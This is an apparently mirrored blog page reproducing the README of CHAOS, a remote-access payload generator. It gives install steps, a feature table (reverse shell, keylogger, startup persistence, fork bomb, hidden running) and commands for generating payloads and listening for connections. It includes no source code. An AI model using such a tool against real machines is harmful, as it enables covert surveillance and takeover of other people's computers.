@@ -1,0 +1,352 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CHAOS : it&#39;s a PoC that allow generate payloads and control remote operating systems | Posts</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.17.1/styles/railscasts.css">
+    <link rel="stylesheet" href="/lightx.css"/>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon512.png">
+    <meta name="theme-color" content="#ffffff"/>
+    
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body>
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', function () {
+          navigator.serviceWorker.register('/sw.js', {scope: '/'})
+            .then(function (registration) {
+              // console.log('ServiceWorker registration successful with scope: ', registration.scope);
+            })
+            .catch(function (err) {
+              console.log('ServiceWorker registration failed: ', err);
+            });
+        });
+      }
+    </script>
+  <div id="page-container">
+    <div id="content-wrap">
+      <div class="wrapper">
+        <div class="container">
+            <nav>
+    <ul>
+      <li><a href="/">Posts</a></li>
+      <li><a href="/archives">Archives</a></li>
+      <li><a href="/about">About</a></li>
+    </ul>
+</nav>
+
+            <article>
+  <h1>CHAOS : it's a PoC that allow generate payloads and control remote operating systems</h1>
+  <div class="contents">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#README-md"><span class="toc-text">README.md</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">CHAOS Payload Generator</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Disclaimer"><span class="toc-text">Disclaimer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Features"><span class="toc-text">Features</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tested-On"><span class="toc-text">Tested On</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-Install"><span class="toc-text">How to Install</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-Use"><span class="toc-text">How to Use</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Video"><span class="toc-text">Video</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gif"><span class="toc-text">Gif</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FAQ"><span class="toc-text">FAQ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Why-does-Keylogger-capture-all-uppercase-letters"><span class="toc-text">Why does Keylogger capture all uppercase letters?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Why-are-necessary-get-and-install-external-libraries"><span class="toc-text">Why are necessary get and install external libraries?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Contact"><span class="toc-text">Contact</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donate"><span class="toc-text">Donate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#License"><span class="toc-text">License</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Repo"><span class="toc-text">Repo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Teching-Video"><span class="toc-text">Teching Video</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Frequent-Issues"><span class="toc-text">Frequent Issues</span></a></li></ol>
+  </div>
+  <h1 id="README-md"><a href="#README-md" class="headerlink" title="README.md"></a><code>README.md</code></h1><p align="center">
+  <img src="https://raw.githubusercontent.com/tiagorlampert/CHAOS/master/content/logo.png">
+</p>
+
+<h1 align="center">CHAOS Payload Generator</h1>
+<p align="center">
+  <a href="https://golang.org/" target="_blank" rel="noopener">
+    <img src="https://img.shields.io/badge/Golang-1.11-blue.svg">
+  </a>
+  <a href="https://github.com/tiagorlampert/CHAOS/blob/master/LICENSE" target="_blank" rel="noopener">
+    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
+  </a>
+  <a href="https://github.com/tiagorlampert/CHAOS/blob/master/main.go" target="_blank" rel="noopener">
+    <img src="https://img.shields.io/badge/Release-3.0-red.svg">
+  </a>
+    <a href="https://opensource.org" target="_blank" rel="noopener">
+    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
+  </a>
+</p>
+
+<p align="center">
+  CHAOS is a PoC that allow generate payloads and control remote operating systems.
+</p>
+
+<h2 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h2><p align="center">
+  :books: This project was created only for learning purpose.
+</p>
+
+<p>THIS SOFTWARE IS PROVIDED “AS IS” WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.</p>
+<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><table>
+<thead>
+<tr>
+<th align="left">Feature</th>
+<th align="center"><img src="https://raw.githubusercontent.com/tiagorlampert/CHAOS/master/content/windows.png" alt="w" title="Windows status"></th>
+<th align="center"><img src="https://raw.githubusercontent.com/tiagorlampert/CHAOS/master/content/mac.png" alt="m" title="Mac OS status"></th>
+<th align="center"><img src="https://raw.githubusercontent.com/tiagorlampert/CHAOS/master/content/linux.png" alt="l" title="Linux status"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>Reverse Shell</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Download File</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Upload File</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Screenshot</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Keylogger</code></td>
+<td align="center">X</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>Persistence</code></td>
+<td align="center">X</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>Open URL</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Get OS Info</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Fork Bomb</code></td>
+<td align="center">X</td>
+<td align="center">X</td>
+<td align="center">X</td>
+</tr>
+<tr>
+<td align="left"><code>Run Hidden</code></td>
+<td align="center">X</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<h2 id="Tested-On"><a href="#Tested-On" class="headerlink" title="Tested On"></a>Tested On</h2><p><a href="https://www.kali.org" target="_blank" rel="noopener"><img src="https://www.google.com/s2/favicons?domain=https://www.kali.org/" alt="Kali)"></a> <strong>Kali Linux - ROLLING EDITION</strong></p>
+<h2 id="How-to-Install"><a href="#How-to-Install" class="headerlink" title="How to Install"></a>How to Install</h2><pre><code class="bash"># Install dependencies
+$ sudo apt install golang git go-dep -y
+
+# Get this repository
+$ go get github.com/tiagorlampert/CHAOS
+
+# Go into the repository
+$ cd ~/go/src/github.com/tiagorlampert/CHAOS
+
+# Get project dependencies
+$ dep ensure
+
+# Run
+$ go run main.go</code></pre>
+<h2 id="How-to-Use"><a href="#How-to-Use" class="headerlink" title="How to Use"></a>How to Use</h2><table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="left">On HOST does…</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>generate</code></td>
+<td align="left">Generate a payload (e.g. <code>generate lhost=192.168.0.100 lport=8080 fname=chaos --windows</code>)</td>
+</tr>
+<tr>
+<td align="left"><code>lhost=</code></td>
+<td align="left">Specify a ip for connection</td>
+</tr>
+<tr>
+<td align="left"><code>lport=</code></td>
+<td align="left">Specify a port for connection</td>
+</tr>
+<tr>
+<td align="left"><code>fname=</code></td>
+<td align="left">Specify a filename to output</td>
+</tr>
+<tr>
+<td align="left"><code>--windows</code></td>
+<td align="left">Target Windows</td>
+</tr>
+<tr>
+<td align="left"><code>--macos</code></td>
+<td align="left">Target Mac OS</td>
+</tr>
+<tr>
+<td align="left"><code>--linux</code></td>
+<td align="left">Target Linux</td>
+</tr>
+<tr>
+<td align="left"><code>listen</code></td>
+<td align="left">Listen for a new connection (e.g. <code>listen lport=8080</code>)</td>
+</tr>
+<tr>
+<td align="left"><code>serve</code></td>
+<td align="left">Serve files</td>
+</tr>
+<tr>
+<td align="left"><code>exit</code></td>
+<td align="left">Quit this program</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="left">On TARGET does…</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>download</code></td>
+<td align="left">File Download</td>
+</tr>
+<tr>
+<td align="left"><code>upload</code></td>
+<td align="left">File Upload</td>
+</tr>
+<tr>
+<td align="left"><code>screenshot</code></td>
+<td align="left">Take a Screenshot</td>
+</tr>
+<tr>
+<td align="left"><code>keylogger_start</code></td>
+<td align="left">Start Keylogger session</td>
+</tr>
+<tr>
+<td align="left"><code>keylogger_show</code></td>
+<td align="left">Show Keylogger session logs</td>
+</tr>
+<tr>
+<td align="left"><code>persistence_enable</code></td>
+<td align="left">Install at Startup</td>
+</tr>
+<tr>
+<td align="left"><code>persistence_disable</code></td>
+<td align="left">Remove from Startup</td>
+</tr>
+<tr>
+<td align="left"><code>getos</code></td>
+<td align="left">Get OS name</td>
+</tr>
+<tr>
+<td align="left"><code>lockscreen</code></td>
+<td align="left">Lock the OS screen</td>
+</tr>
+<tr>
+<td align="left"><code>openurl</code></td>
+<td align="left">Open the URL informed</td>
+</tr>
+<tr>
+<td align="left"><code>bomb</code></td>
+<td align="left">Run Fork Bomb</td>
+</tr>
+<tr>
+<td align="left"><code>clear</code></td>
+<td align="left">Clear the Screen</td>
+</tr>
+<tr>
+<td align="left"><code>back</code></td>
+<td align="left">Close connection but keep running on target</td>
+</tr>
+<tr>
+<td align="left"><code>exit</code></td>
+<td align="left">Close connection and exit on target</td>
+</tr>
+</tbody></table>
+<h2 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h2><p align="center">
+<a href="https://www.youtube.com/watch?v=Fq_0yDPFjYE" target="_blank" rel="noopener">
+  <img src="https://img.youtube.com/vi/Fq_0yDPFjYE/maxresdefault.jpg" width="700">
+</a></p>
+
+<h2 id="Gif"><a href="#Gif" class="headerlink" title="Gif"></a>Gif</h2><p align="center">
+<img src="https://github.com/tiagorlampert/CHAOS/blob/master/content/screenshot.gif">
+</p>
+
+<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><blockquote>
+<h4 id="Why-does-Keylogger-capture-all-uppercase-letters"><a href="#Why-does-Keylogger-capture-all-uppercase-letters" class="headerlink" title="Why does Keylogger capture all uppercase letters?"></a>Why does Keylogger capture all uppercase letters?</h4><p>All the letters obtained using the keylogger are uppercase letters. It is a known issue, in case anyone knows how to fix the Keylogger function using golang, please contact me or open an issue.</p>
+</blockquote>
+<blockquote>
+<h4 id="Why-are-necessary-get-and-install-external-libraries"><a href="#Why-are-necessary-get-and-install-external-libraries" class="headerlink" title="Why are necessary get and install external libraries?"></a>Why are necessary get and install external libraries?</h4><p>To implement the screenshot function i used a third-party library, you can check it in <a href="https://github.com/kbinani/screenshot" target="_blank" rel="noopener">https://github.com/kbinani/screenshot</a> and <a href="https://github.com/lxn/win" target="_blank" rel="noopener">https://github.com/lxn/win</a>. You must download and install it to generate the payload.</p>
+</blockquote>
+<h2 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h2><p>:email: <strong><a href="mailto:tiagorlampert@gmail.com">tiagorlampert@gmail.com</a></strong></p>
+<h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>If you enjoyed this project, give me a cup of coffee. :)</p>
+<p><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=SG83FSKPKCRJ6&currency_code=USD&source=url" target="_blank" rel="noopener"><img src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" alt="Donate"></a></p>
+<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><blockquote>
+<p>The <a href="https://opensource.org/licenses/BSD-3-Clause" target="_blank" rel="noopener">BSD 3-Clause License</a></p>
+<p>Copyright (c) 2017, Tiago Rodrigo Lampert</p>
+<p>All rights reserved.</p>
+<p>Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:</p>
+<ul>
+<li><p>Redistributions of source code must retain the above copyright notice, this<br>list of conditions and the following disclaimer.</p>
+</li>
+<li><p>Redistributions in binary form must reproduce the above copyright notice,<br>this list of conditions and the following disclaimer in the documentation<br>and/or other materials provided with the distribution.</p>
+</li>
+<li><p>Neither the name of the copyright holder nor the names of its<br>contributors may be used to endorse or promote products derived from<br>this software without specific prior written permission.</p>
+</li>
+</ul>
+<p>THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS”<br>AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE<br>IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE<br>DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE<br>FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL<br>DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR<br>SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER<br>CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,<br>OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE<br>OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</p>
+</blockquote>
+<h1 id="Repo"><a href="#Repo" class="headerlink" title="Repo"></a><code>Repo</code></h1><blockquote>
+<p><em>github repo : <a href="https://github.com/tiagorlampert/CHAOS" target="_blank" rel="noopener">https://github.com/tiagorlampert/CHAOS</a></em></p>
+</blockquote>
+<h1 id="Teching-Video"><a href="#Teching-Video" class="headerlink" title="Teching Video"></a><code>Teching Video</code></h1><blockquote>
+<p><em>How to use it : <a href="https://youtu.be/Fq_0yDPFjYE" target="_blank" rel="noopener">https://youtu.be/Fq_0yDPFjYE</a></em></p>
+</blockquote>
+<h1 id="Frequent-Issues"><a href="#Frequent-Issues" class="headerlink" title="Frequent Issues"></a><code>Frequent Issues</code></h1><blockquote>
+<p>. . .</p>
+</blockquote>
+
+  
+  <p class="copyright"><strong>Links: <a href="http://yoursite.com/2020/06/10/CHAOS-it-s-a-PoC-that-allow-generate-payloads-and-control-remote-operating-systems/">http://yoursite.com/2020/06/10/CHAOS-it-s-a-PoC-that-allow-generate-payloads-and-control-remote-operating-systems/</a></strong></p>  
+</article>
+
+<div id="comment">
+    
+</div>
+        </div>
+      </div>
+    </div>
+    <div id="footer">
+      <div class="wrapper">
+        <div class="container">
+          
+<button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">TOP</button>
+<footer>
+    <div>
+        <p>
+            © 2022 <a href="http://yoursite.com">John Doe</a>.
+            Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>.
+            Theme <a href="https://github.com/songquanpeng/hexo-theme-lightx" target="_blank" rel="noopener">lightx</a>.
+            
+        </p>
+    </div>
+</footer>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  </body>
+</html>
